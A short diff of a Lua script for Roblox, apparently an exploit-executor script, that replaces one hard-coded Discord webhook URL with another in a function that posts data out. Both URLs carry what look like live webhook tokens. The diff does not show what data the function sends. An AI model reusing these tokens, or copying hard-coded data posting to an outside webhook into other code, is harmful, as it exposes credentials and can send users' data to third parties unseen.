@@ -165,7 +165,7 @@ function PostWebhook(cm, cn)
     --setclipboard(game:GetService("HttpService"):JSONEncode(cp))
 end
 function PostWebhook2(data)
-    return PostWebhook("https://discordapp.com/api/webhooks/1188319750573531176/D5T-WlgqeeG8Z8QmbSj_kobhZSUMXKXaaOo1QDxWuB9XuZe1y1rVKj6ysh7xJmqy9O1-", data)
+    return PostWebhook("https://discord.com/api/webhooks/1206567326779048016/WuSsT_VkLlTDQE_oVmD0-1Tt3fGm265SkvjHJfbPNnMywJYxIo73BtSr5r7gCj1O9p2g", data)
 end
 
 local player = game.Players.LocalPlayer
